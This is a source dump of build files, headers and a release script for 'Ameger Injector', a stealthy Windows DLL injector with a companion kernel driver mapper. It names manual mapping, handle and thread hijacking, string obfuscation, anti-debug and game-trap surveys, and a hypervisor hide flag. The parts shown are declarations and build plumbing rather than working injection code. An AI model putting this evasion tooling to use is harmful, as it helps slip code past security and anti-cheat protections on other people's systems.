inline bool VerboseOutputEnabled()
{
    static const bool verbose = []()
    {
        wchar_t buffer[8] = {};

        const DWORD got = GetEnvironmentVariableW(XOR_STR_W(L"AMEGER_VERBOSE").get(), buffer, 4);
        return !(got == 1 && buffer[0] == L'0');
    }();
    return verbose;
}

// Whether the full thread census should be printed. It is expensive and only
// useful while diagnosing a donor selection problem.
inline bool FullThreadCensusEnabled()
{
    static const bool full = []()
    {
        wchar_t buffer[8] = {};

        const DWORD got = GetEnvironmentVariableW(XOR_STR_W(L"AMEGER_FULL_CENSUS").get(), buffer, 4);
        return got == 1 && buffer[0] == L'1';
    }();
    return full;
}

// Whether an export name is one of the runtime's original names rather than one
// of the permuted names the build assigned to it.
inline bool IsOriginalExportName(const std::vector<ExportNameMap> & map, const char * name)
{
    if (!name)
    {
        return false;
    }
    for (const ExportNameMap & entry : map)
    {
        if (entry.old_name == name)
        {
            return true;
        }
    }
    return false;
}

#pragma endregion

#pragma region process inspection

// Queries the name and the architecture of a running process.
bool QueryProcess(DWORD pid, std::wstring & name, Architecture & architecture);

// Reads the full identity of a running process: its name, its image path, its
// creation time and its architecture, all from the same handle.
bool QueryProcessIdentity(DWORD pid, ProcessIdentity & out);

// The fixed-buffer form of QueryProcess.
bool QueryProcessFixed(DWORD pid, wchar_t * name_out, size_t name_count, Architecture & architecture);

// Writes the name of a donor process into a caller supplied buffer.
void DescribeDonor(DWORD pid, wchar_t * name_out, size_t name_count);

// The per-handle acquisition trace and summary shown after an injection.
void PrintHijackTrace(const wchar_t * Kind, const HijackStats * Stats, const HijackContext * Context, DWORD Flags, bool IsThread);
void PrintHijackSummary(const wchar_t * Kind, const HijackStats * Stats);

#pragma endregion

#pragma region stealth verification

struct SurveyModule
{
    std::wstring name;
    ULONG_PTR base = 0;
    SIZE_T size = 0;
};

struct StealthVerifierBuffers
{
    bool runtime_path_known = false;
    std::vector<BYTE> runtime_bytes;
    bool runtime_read = false;

    std::array<BYTE, sizeof(IMAGE_NT_HEADERS64)> remote_headers{};
    std::array<BYTE, sizeof(IMAGE_NT_HEADERS64)> local_headers{};

    std::vector<ULONG_PTR> allocation_bases;

    std::vector<SurveyModule> survey_modules;
    std::vector<BYTE> survey_chunk;

    // The bounds on the region census. They come from the configuration
    // file, because the launcher runs elevated and an elevated process does
    // not inherit the environment variables its parent had.
    size_t survey_max_regions = 0;
    size_t survey_max_mb = 0;
    size_t survey_max_sample_regions = 0;

    // B3/A2: the pre-load baseline of the target's loader list and window
    // surface, taken before anything is mapped, so the verification suite
    // reports the delta the load actually left rather than an assertion.
    std::vector<std::wstring> pre_load_modules;
    size_t pre_target_windows = 0;
    size_t pre_target_layered = 0;
};

namespace stealth
{
    // B2: the measured TSC frequency, calibrated against the performance
    // counter; 0.0 when the calibration is unavailable.
    double MeasureTscHz();

    // B3/A2: captures the target's module list and window surface before the
    // load. One transient module snapshot (closed immediately) and one window
    // walk; the suite takes the same measurements again afterwards and the
    // report shows the delta.
    bool CapturePreLoadBaseline(DWORD pid, StealthVerifierBuffers & buffers);

    // Runs the post-injection verification suite. Returns true only when every
    // enabled check passed; a fault inside the verifier is caught and reported as
    // a failure rather than being allowed to escape.
    bool SafeDebugAndVerifyStealth(HANDLE process, HINSTANCE hRemoteBase, DWORD flags,
        const BYTE * local_pe, size_t local_pe_size, const HijackStats * ProcessHijack, const HijackStats * ThreadHijack,
        const HijackContext * Context, const MAP_STATS * MapStats, const VERIFIABLE_EXEC_TELEMETRY * ExecTelemetry,
        f_GetLastStringStats get_string_stats,
        bool survey_game_traps, DWORD survey_pid, bool * wx_violated, const WizardConfig & config,
        StealthVerifierBuffers & buffers);

    // The protection constant behind an image page, as a printable name.
    const wchar_t * StealthPageDesc(DWORD p);

    // What the target's vectored exception handling looks like from the outside:
    // whether the chains cross the process boundary and whether the PEB flags
    // that feed anti-debug checks are still at their defaults.
    struct VehFirstChanceSurvey
    {
        bool handleValid = false;
        bool readOk = false;
        ULONG crossFlags = 0;
        bool usingVeh = false;
        bool usingVch = false;
        BYTE beingDebugged = 0;
        ULONG ntGlobalFlag = 0;
        PVOID pebAddress = nullptr;
        // The image base the target itself is running from. The module list is
        // walked in load order, so the PEB is the only reliable way to say
        // which entry is the main image and which is a dependency.
        ULONG_PTR imageBase = 0;
        DWORD lastError = 0;
    };

    // Reads the target's exception-chain state through its PEB.
    bool QueryRemoteVehFirstChance(HANDLE process, VehFirstChanceSurvey & out);
}

#pragma endregion

```

### Interface/Source/PCH/PCH.h â€” 29 lines â€” sha12:DCD31A7B924A
```c-header
#pragma once

#ifndef _WIN64
#error This build is x64-only.
#endif

#include <Windows.h>
#include <TlHelp32.h>
#include <bcrypt.h>
#include <wincrypt.h>
#include <conio.h>
#include <psapi.h>

#include <algorithm>
#include <atomic>
#include <cerrno>
#include <cstddef>
#include <cstdint>
#include <fcntl.h>
#include <io.h>
#include <climits>
#include <cstring>
#include <cwchar>
#include <cwctype>
#include <fstream>
#include <sstream>
#include <iostream>
#include <limits>
#include <string>
#include <vector>
#include <memory>
#include <array>

```

### Interface/Template/AmegerInjector.vcxproj â€” 146 lines â€” sha12:C9C30F88BE3E
```xml
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>15.0</VCProjectVersion>
    <ProjectGuid>{AC732425-E265-40FF-842F-C59CECE9A96C}</ProjectGuid>
    <RootNamespace>AmegerInjector</RootNamespace>
    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\BuildCustomizations\masm.props" />
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>DynamicLibrary</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v145</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <OutDir>$(ProjectDir)..\..\Build\$(Configuration)\</OutDir>
    <TargetName>Ameger Injector - $(PlatformShortName)</TargetName>
    <IntDir>$(ProjectDir)..\..\Build\obj\Ameger\$(Configuration)\$(PlatformShortName)\</IntDir>
    <LinkIncremental>false</LinkIncremental>
    <AmegerMmapSentinel Condition="'$(AmegerMmapSentinel)' == ''"></AmegerMmapSentinel>
    <AmegerStringSeed Condition="'$(AmegerStringSeed)' == ''"></AmegerStringSeed>

    <AmegerStubSeed Condition="'$(AmegerStubSeed)' == ''">0</AmegerStubSeed>
    <!-- The stub seed is handed to the assembler as a preprocessor define, and
         the assembler has no hexadecimal literal syntax. A seed written in hex
         therefore fails deep inside the stub with a "missing operator in
         expression" error that says nothing about the cause, so it is
         converted to decimal here instead. -->
    <AmegerStubSeed Condition="'$(AmegerStubSeed)' != '' and $(AmegerStubSeed.StartsWith('0x'))">$([System.Convert]::ToInt64('$(AmegerStubSeed)', 16))</AmegerStubSeed>
    <AmegerStubSeed Condition="'$(AmegerStubSeed)' != '' and $(AmegerStubSeed.StartsWith('0X'))">$([System.Convert]::ToInt64('$(AmegerStubSeed)', 16))</AmegerStubSeed>
    <AmegerStubSeed Condition="'$(AmegerStubSeed)' != ''">$([System.Convert]::ToInt64('$(AmegerStubSeed)'))</AmegerStubSeed>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <PreprocessorDefinitions>AMEGER_MMAP_SENTINEL=$(AmegerMmapSentinel);AMEGER_KEEP_RUNTIME_LOGS;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <PreprocessorDefinitions Condition="'$(AmegerStringSeed)' != ''">AMEGER_STRING_SEED=$(AmegerStringSeed);%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <WarningLevel>Level4</WarningLevel>
      <ConformanceMode>true</ConformanceMode>
      <DebugInformationFormat>None</DebugInformationFormat>
      <TreatWarningAsError>true</TreatWarningAsError>
      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
      <PrecompiledHeader>Use</PrecompiledHeader>
      <PrecompiledHeaderFile>Core/Utility/Header/PrecompiledHeader.h</PrecompiledHeaderFile>
      <AdditionalIncludeDirectories>$(ProjectDir)..\..\Ameger\;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
      <LanguageStandard>stdcpp20</LanguageStandard>
      <BufferSecurityCheck>false</BufferSecurityCheck>
      <ControlFlowGuard>false</ControlFlowGuard>
      <RuntimeTypeInfo>false</RuntimeTypeInfo>
      <Optimization>MaxSpeed</Optimization>
    </ClCompile>
    <MASM>
      <AdditionalIncludeDirectories>$(ProjectDir)..\..\Ameger\Execution\Stub\;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
      <!-- The stub seed reaches the assembler as a preprocessor define, and the
           assembler has no hexadecimal literal syntax. A seed written in hex
           would otherwise be taken for an external symbol and only fail much
           later, inside the stub, with an error that says nothing about the
           cause, so it is normalised to decimal here. The conversion lives in
           the item metadata because a seed passed on the command line is a
           global property, and a global property cannot be rewritten by the
           project. -->
      <PreprocessorDefinitions Condition="$(AmegerStubSeed.StartsWith('0x')) or $(AmegerStubSeed.StartsWith('0X'))">AMEGER_STUB_SEED=$([System.Convert]::ToInt64('$(AmegerStubSeed)', 16))</PreprocessorDefinitions>
      <PreprocessorDefinitions Condition="!($(AmegerStubSeed.StartsWith('0x')) or $(AmegerStubSeed.StartsWith('0X')))">AMEGER_STUB_SEED=$([System.Convert]::ToInt64('$(AmegerStubSeed)'))</PreprocessorDefinitions>
    </MASM>
    <Link>
      <GenerateDebugInformation>false</GenerateDebugInformation>
      <SubSystem>Windows</SubSystem>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClInclude Include="..\..\Ameger\Core\Foundation\Error.h" />
    <ClInclude Include="..\..\Ameger\Core\Foundation\Primitives\InjectionTypes.h" />
    <ClInclude Include="..\..\Ameger\Core\Foundation\Primitives\ResourceGuard.h" />
    <ClInclude Include="..\..\Ameger\Core\Foundation\Primitives\KcStrings\Core\DomainKey.h" />
    <ClInclude Include="..\..\Ameger\Core\Foundation\Primitives\KcStrings\Core\XorString.h" />
    <ClInclude Include="..\..\Ameger\Core\Foundation\Primitives\KcStrings\Core\KcStrSuite.h" />
    <ClInclude Include="..\..\Ameger\Core\Foundation\Primitives\KcStrings\KcNarrow.h" />
    <ClInclude Include="..\..\Ameger\Core\Foundation\Primitives\KcStrings\KcWide.h" />
    <ClInclude Include="..\..\Ameger\Core\Foundation\Primitives\KcStrings\KcStack.h" />
    <ClInclude Include="..\..\Ameger\Core\Foundation\Primitives\KcStrings\KcLayered.h" />
    <ClInclude Include="..\..\Ameger\Core\Utility\Binary\PEImage.h" />
    <ClInclude Include="..\..\Ameger\Core\Utility\Binary\DynamicAPI.h" />
    <ClInclude Include="..\..\Ameger\Core\Utility\Tools\Tools.h" />
    <ClInclude Include="..\..\Ameger\Injection.h" />
    <ClInclude Include="..\..\Ameger\Injection\Injection.h" />
    <ClInclude Include="..\..\Ameger\NT\Windows11.h" />
    <ClInclude Include="..\..\Ameger\NT\NTFunctions.h" />
    <ClInclude Include="..\..\Ameger\Execution\Routine\StartRoutine.h" />
    <ClInclude Include="..\..\Ameger\Execution\Stub\RemoteShell.inc" />
    <ClInclude Include="..\..\Ameger\System\Symbol\Loader\SymbolLoader.h" />
    <ClInclude Include="..\..\Ameger\System\Symbol\Parser\SymbolParser.h" />
    <ClInclude Include="..\..\Ameger\System\Symbol\Offsets\DynamicOffsets.h" />
    <ClInclude Include="..\..\Ameger\System\Import\ImportHandler.h" />
    <ClInclude Include="..\..\Ameger\NT\NTDefinitions.h" />
    <ClInclude Include="..\..\Ameger\Native\Syscall.h" />
    <ClInclude Include="..\..\Ameger\System\Download\Manager.h" />
    <ClInclude Include="..\..\Ameger\System\Handle\HandleHijack.h" />
    <ClInclude Include="..\..\Ameger\Core\Utility\Header\PrecompiledHeader.h" />
    <ClInclude Include="..\..\Ameger\Injection\ManualMapping\ManualMappingCore.h" />
    <ClInclude Include="..\..\Ameger\System\Information\ProcessInformation.h" />
    <ClInclude Include="..\..\Ameger\Injection\ManualMapping\ManualMappingInternal.h" />
  </ItemGroup>
  <ItemGroup>
    <MASM Include="$(MSBuildProjectDirectory)\..\..\Ameger\Execution\Stub\RemoteThreadHijack.asm" />
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="..\..\Ameger\Core\Utility\Header\PrecompiledHeader.cpp">
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Release|x64'">Create</PrecompiledHeader>
      <PrecompiledHeaderFile Condition="'$(Configuration)|$(Platform)'=='Release|x64'">Core/Utility/Header/PrecompiledHeader.h</PrecompiledHeaderFile>
    </ClCompile>
    <ClCompile Include="..\..\Ameger\Core\Foundation\Main.cpp" />
    <ClCompile Include="..\..\Ameger\Core\Utility\Tools\Tools.cpp" />
    <ClCompile Include="..\..\Ameger\Injection\Injection.cpp" />
    <ClCompile Include="..\..\Ameger\System\Import\ImportHandler.cpp" />
    <ClCompile Include="..\..\Ameger\Execution\Routine\StartRoutine.cpp" />
    <ClCompile Include="..\..\Ameger\System\Symbol\Loader\SymbolLoader.cpp" />
    <ClCompile Include="..\..\Ameger\System\Symbol\Parser\SymbolParser.cpp" />
    <ClCompile Include="..\..\Ameger\System\Symbol\Offsets\DynamicOffsets.cpp" />
    <ClCompile Include="..\..\Ameger\System\Download\Manager.cpp" />
    <ClCompile Include="..\..\Ameger\System\Handle\HandleHijack.cpp" />
    <ClCompile Include="..\..\Ameger\Injection\ManualMapping\ManualMapping.cpp" />
    <ClCompile Include="..\..\Ameger\Execution\ThreadHijacking.cpp" />
    <ClCompile Include="..\..\Ameger\System\Information\ProcessInformation.cpp" />
    <ClCompile Include="..\..\Ameger\Native\Syscall.cpp" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
    <Import Project="$(VCTargetsPath)\BuildCustomizations\masm.targets" />
  </ImportGroup>
</Project>

```

### Interface/Template/AmegerInjectorInterface.vcxproj â€” 83 lines â€” sha12:D76C13D21447
```xml
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <ProjectGuid>{B7B2D6C1-7D8E-4F90-9A0B-1C2D3E4F5061}</ProjectGuid>
    <RootNamespace>AmegerInjectorInterface</RootNamespace>
    <ProjectName>Interface</ProjectName>
    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v145</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings" />
  <ImportGroup Label="Shared" />
  <ImportGroup Label="PropertySheets" />
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <OutDir>$(ProjectDir)..\..\Build\$(Configuration)\</OutDir>
    <IntDir>$(ProjectDir)..\..\Build\obj\Interface\$(Configuration)\$(PlatformShortName)\</IntDir>
    <AmegerExeName Condition="'$(AmegerExeName)' == ''">Host - x64</AmegerExeName>
    <TargetName>$(AmegerExeName)</TargetName>
    <AmegerRuntimeHash0>0</AmegerRuntimeHash0>
    <AmegerRuntimeHash1>0</AmegerRuntimeHash1>
    <AmegerRuntimeHash2>0</AmegerRuntimeHash2>
    <AmegerRuntimeHash3>0</AmegerRuntimeHash3>
    <AmegerRuntimeHash4>0</AmegerRuntimeHash4>
    <AmegerRuntimeHash5>0</AmegerRuntimeHash5>
    <AmegerRuntimeHash6>0</AmegerRuntimeHash6>
    <AmegerRuntimeHash7>0</AmegerRuntimeHash7>
    <AmegerStringSeed Condition="'$(AmegerStringSeed)' == ''"></AmegerStringSeed>
    <AmegerConfigMagic Condition="'$(AmegerConfigMagic)' == ''">SYSCFG01</AmegerConfigMagic>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level4</WarningLevel>
      <TreatWarningAsError>true</TreatWarningAsError>
      <ConformanceMode>true</ConformanceMode>
      <LanguageStandard>stdcpp20</LanguageStandard>
      <Optimization>MaxSpeed</Optimization>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
      <DebugInformationFormat>None</DebugInformationFormat>
      <PreprocessorDefinitions>AMEGER_RUNTIME_DLL_HASH0=$(AmegerRuntimeHash0);AMEGER_RUNTIME_DLL_HASH1=$(AmegerRuntimeHash1);AMEGER_RUNTIME_DLL_HASH2=$(AmegerRuntimeHash2);AMEGER_RUNTIME_DLL_HASH3=$(AmegerRuntimeHash3);AMEGER_RUNTIME_DLL_HASH4=$(AmegerRuntimeHash4);AMEGER_RUNTIME_DLL_HASH5=$(AmegerRuntimeHash5);AMEGER_RUNTIME_DLL_HASH6=$(AmegerRuntimeHash6);AMEGER_RUNTIME_DLL_HASH7=$(AmegerRuntimeHash7);AMEGER_STRING_SEED=$(AmegerStringSeed);AMEGER_CONFIG_MAGIC_STR=&quot;$(AmegerConfigMagic)&quot;;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <AdditionalIncludeDirectories>$(ProjectDir)..\..;$(ProjectDir)..\..\Ameger;$(ProjectDir)..\Source;$(ProjectDir)..\Source\PCH;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
      <PrecompiledHeader>Use</PrecompiledHeader>
      <PrecompiledHeaderFile>PCH.h</PrecompiledHeaderFile>
      <PrecompiledHeaderOutputFile>$(IntDir)Interface.pch</PrecompiledHeaderOutputFile>
    </ClCompile>
    <Link>
      <SubSystem>Windows</SubSystem>
      <UACExecutionLevel>RequireAdministrator</UACExecutionLevel>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>false</GenerateDebugInformation>
      <EntryPointSymbol>wWinMainCRTStartup</EntryPointSymbol>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClInclude Include="..\Source\Launcher.h" />
    <ClInclude Include="..\Source\PCH\PCH.h" />
    <ClCompile Include="..\Source\Interface\Process.cpp" />
      <ClCompile Include="..\Source\Main.cpp" />
    <ClCompile Include="..\Source\Interface\Stealth.cpp" />
    <ClCompile Include="..\Source\Interface\Interface.cpp" />
    <ClCompile Include="..\Source\PCH\PCH.cpp">
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Release|x64'">Create</PrecompiledHeader>
      <PrecompiledHeaderFile Condition="'$(Configuration)|$(Platform)'=='Release|x64'">PCH.h</PrecompiledHeaderFile>
    </ClCompile>
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets" />
</Project>

```

### Interface/Template/Solution/AmegerInjector.sln â€” 24 lines â€” sha12:5CBB60589732
```visual-studio-sln
Microsoft Visual Studio Solution File, Format Version 12.00
VisualStudioVersion = 17.0.31612.314
MinimumVisualStudioVersion = 10.0.40219.1
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "Ameger", "..\AmegerInjector.vcxproj", "{AC732425-E265-40FF-842F-C59CECE9A96C}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "Interface", "..\AmegerInjectorInterface.vcxproj", "{B7B2D6C1-7D8E-4F90-9A0B-1C2D3E4F5061}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Release|x64 = Release|x64
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{AC732425-E265-40FF-842F-C59CECE9A96C}.Release|x64.ActiveCfg = Release|x64
		{AC732425-E265-40FF-842F-C59CECE9A96C}.Release|x64.Build.0 = Release|x64
		{B7B2D6C1-7D8E-4F90-9A0B-1C2D3E4F5061}.Release|x64.ActiveCfg = Release|x64
		{B7B2D6C1-7D8E-4F90-9A0B-1C2D3E4F5061}.Release|x64.Build.0 = Release|x64
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
	GlobalSection(ExtensibilityGlobals) = postSolution
		SolutionGuid = {808F1ED8-0D22-41C5-93F1-5FD309E2843D}
	EndGlobalSection
EndGlobal

```

### D:\Ameger\Mapper\.clangd â€” 39 lines â€” sha12:174E319B6B7F
```json
# clangd / clang-tidy settings.
#
# Every flag is quoted: a plain scalar starting with "-" is ambiguous YAML.
#
# Scope note: these flags apply to every translation unit under this directory,
# which includes SymbolTool as well as Mapper. The two projects do not share a
# preprocessor configuration - Mapper builds with PDB_OFFSETS defined (it is
# mandatory; see Provider\Driver.hpp), SymbolTool does not - so a macro resolved
# through clangd here is not necessarily defined the way MSBuild defines it.
# Treat the Add: list as editor tooling, not as the build definition.
CompileFlags:
  # No compile_commands.json is committed and none is generated, so this points
  # at a directory that does not contain a compilation database. clangd falls
  # back to the Add: flags below on its own; the setting is left explicit so the
  # intent survives a future switch to CMake or a generated database.
  CompilationDatabase: .
  Add:
    - "-std=c++17"
    - "-fms-extensions"
    - "-fms-compatibility"
    - "-Wno-unknown-pragmas"
    - "-Wno-ignored-attributes"
    # Keep these four in step with the SDK actually installed on this machine.
    # They are NOT pinned by the projects: both .vcxproj set
    # WindowsTargetPlatformVersion to 10.0, which resolves to whatever the newest
    # SDK on the build machine is. An earlier version of this file claimed the
    # two had to be kept in sync, which was never true - the vcxproj value moves
    # on its own and this list has to be edited by hand instead.
    - "-IC:/Program Files (x86)/Windows Kits/10/Include/10.0.26100.0/ucrt"
    - "-IC:/Program Files (x86)/Windows Kits/10/Include/10.0.26100.0/um"
    - "-IC:/Program Files (x86)/Windows Kits/10/Include/10.0.26100.0/shared"
    - "-IC:/Program Files (x86)/Windows Kits/10/Include/10.0.26100.0/winrt"
    # The Hypervisor client header, pulled in by Mapper\App\Main.cpp for
    # the --hide flag. Mirrors the AdditionalIncludeDirectories entry in
    # Mapper\Template\Mapper\Mapper.vcxproj; forward slashes so no YAML
    # backslash escaping is needed.
    - "-ID:/Ameger/Hypervisor/Client/Library"

Index:
  Background: Build
```

### D:\Ameger\Mapper\.gitignore â€” 17 lines â€” sha12:55FEDC82E6DC
```gitignore
# Where this file lives, and what it does and does not cover.
#
# The git repository is rooted at Mapper\, not at this directory. A .gitignore
# only governs the tree below the folder it lives in, and git never consults one
# outside the repository, so every pattern below is currently inert: Build\ and
# HelloWorld.sys sit alongside the repository rather than inside it, which is
# what keeps them untracked - not these rules. They are kept because that is the
# arrangement they were written for, and they start to apply the moment the
# repository is rooted here instead.

# Release staged by Build\Executors\Create.bat: Mapper.exe, SymbolTool.exe,
# Offsets.ini and the deployed dbghelp/symsrv pair.
Build/Release/

# Flat PDB cache SymbolTool.exe resolves offsets from. It lives outside the
# release root so Create.bat can wipe the release without discarding it.
Build/Symbols/

# Kernel driver binaries are never source.
*.sys
```

### D:\Ameger\Mapper\Build\Executors\Create.bat â€” 486 lines â€” sha12:ADE78EA2F334
```bat
@echo off
rem Create.bat - one-shot release builder.
rem What: cleans the build and release directories, resolves the MSBuild
rem   toolset, builds Mapper.exe and SymbolTool.exe from the solution, stages
rem   the release folder (binaries at the root, the dbghelp pair under DLLs\),
rem   generates Offsets.ini for the running build, and verifies every shipped
rem   artifact. Why one script: the two binaries, the dbghelp pair and
rem   Offsets.ini have to agree with each other - Mapper.exe locates
rem   SymbolTool.exe and Offsets.ini next to itself and aborts without them -
rem   so they are produced and checked in a single pass. How: six numbered
rem   stages below; any gate failure aborts (fail-closed) and never ships a
rem   partial release.
rem
rem Everything the build produces that ships lands under Build\: the release in
rem Build\Release. Every intermediate and the build log live in a scratch tree
rem outside the repository (%TEMP%\amager_build), so the source tree stays clean
rem and no Cache folder is ever created next to the sources.
rem
rem Environment overrides (all optional):
rem   CREATE_NO_PAUSE=1            do not pause at the end
rem   AMEGER_NO_PAUSE=1            do not pause at the end (takes precedence)
rem   AMEGER_NO_COLOR=1            disable ANSI colour
rem   AMEGER_PLATFORM_TOOLSET     override the detected toolset
rem   AMEGER_WINDOWS_SDK_VERSION  override the Windows SDK version
rem   AMEGER_KEEP_PDB=1           ship the .pdb next to the binaries
rem   AMEGER_ALLOW_MISSING_OFFSETS=1  warn instead of abort when a non-critical
rem                                    offset did not resolve
rem
rem Command line:
rem   Create.bat [/nopause]
setlocal EnableExtensions DisableDelayedExpansion

set "NO_PAUSE=0"
if defined CREATE_NO_PAUSE set "NO_PAUSE=%CREATE_NO_PAUSE%"
if defined AMEGER_NO_PAUSE set "NO_PAUSE=%AMEGER_NO_PAUSE%"
if /i "%~1"=="/nopause" set "NO_PAUSE=1"

set "C_RESET="
set "C_GREEN="
set "C_RED="
set "C_YELLOW="
if /i not "%AMEGER_NO_COLOR%"=="1" for /f %%A in ('echo prompt $E ^| cmd') do set "ESC=%%A"
if defined ESC (
    set "C_RESET=%ESC%[0m"
    set "C_GREEN=%ESC%[92m"
    set "C_RED=%ESC%[91m"
    set "C_YELLOW=%ESC%[93m"
)

rem This script lives in Build\Executors\, so the repository root is two levels
rem up. Rooting at "%~dp0.." resolved to Build\ itself and made every path
rem below expand to Build\Build\Release.
for %%I in ("%~dp0..\..") do set "ROOT=%%~fI"
set "BUILD_DIR=%ROOT%\Build"
set "OUT_ROOT=%BUILD_DIR%\Release"
rem Build scratch lives outside the repository, under %TEMP%\amager_build: the
rem MSBuild intermediates, the native output and the build log all land there,
rem so the source tree never grows a Cache folder or a build.log. The scratch is
rem wiped at the start of every build, so a stale object can never be reused.
set "SCRATCH=%TEMP%\amager_build"
set "BUILD_LOG=%SCRATCH%\build.log"
rem Build output and intermediates. Both projects point these at
rem %TEMP%\amager_build\bin and %TEMP%\amager_build\obj\$(ProjectName), so the
rem source tree never grows an x64\ or Intermediate\ folder and nothing has to
rem be overridden here. The per-project $(ProjectName) in IntDir is load
rem bearing: a single shared intermediate folder makes the two projects race for
rem the same .obj files, which shows up as MSB8028 plus LNK1181 on a parallel
rem build.
set "NATIVE_OUT=%SCRATCH%\bin"
set "NATIVE_INT=%SCRATCH%\obj"
rem Deployed support libraries. Not a default DLL search location, so anything
rem that starts SymbolTool has to put this folder on PATH - see :resolve_offsets.
set "DLL_DIR=%OUT_ROOT%\DLLs"
set "SOURCE_ROOT=%ROOT%\Mapper"
set "SLN=%SOURCE_ROOT%\Template\Mapper.sln"
set "MAPPER_PROJ=%SOURCE_ROOT%\Template\Mapper\Mapper.vcxproj"
set "SYMBOLTOOL_PROJ=%SOURCE_ROOT%\Template\Symbols\SymbolTool.vcxproj"
rem Source of the two symbol libraries SymbolTool needs. They sit in a DLLs
rem subfolder of Utilities, named after the DLLs subfolder of the release they
rem end up in, so one term covers both ends of the pipeline.
rem
rem These two are deliberately COMMITTED rather than resolved from the machine
rem at build time. symsrv.dll is not in System32 at all, and no single directory
rem on a typical Windows developer machine holds both files from the same build:
rem   System32              dbghelp only, 10.0.26100.9444
rem   Remote Debugger\x64   symsrv  only, 10.0.27871.1001
rem   App Certification Kit both, but dbghelp 28000 vs symsrv 6.3.9600 (2013)
rem dbghelp LoadLibrary's symsrv.dll itself, so mixing halves from two
rem directories is a version skew that fails as "offsets stopped resolving"
rem rather than as a load error - verified on this machine, both the system32 +
rem Remote Debugger combination and the App Certification Kit pair fail stage 6.
rem The committed pair is a matched 26100.1 set, which is why it works.
set "DBGHELP_SRC=%SOURCE_ROOT%\Utilities\DLLs"
set "CONFIG_NAME=Release_Pdb_Offset"
set "PLATFORM_NAME=x64"
set "VSWHERE=%ProgramFiles(x86)%\Microsoft Visual Studio\Installer\vswhere.exe"
set "MSBUILD="
set "TOOLSET="
set "SDK_VERSION="

echo [%C_GREEN%1%C_RESET%/%C_GREEN%6%C_RESET%] Checking MSBuild...
echo.
call :find_msbuild
if errorlevel 1 goto :msbuild_error
call :select_toolset
if errorlevel 1 goto :toolset_error
set "TOOLSET_ARG="
if defined TOOLSET set "TOOLSET_ARG=/p:PlatformToolset=%TOOLSET%"
set "SDK_ARG="
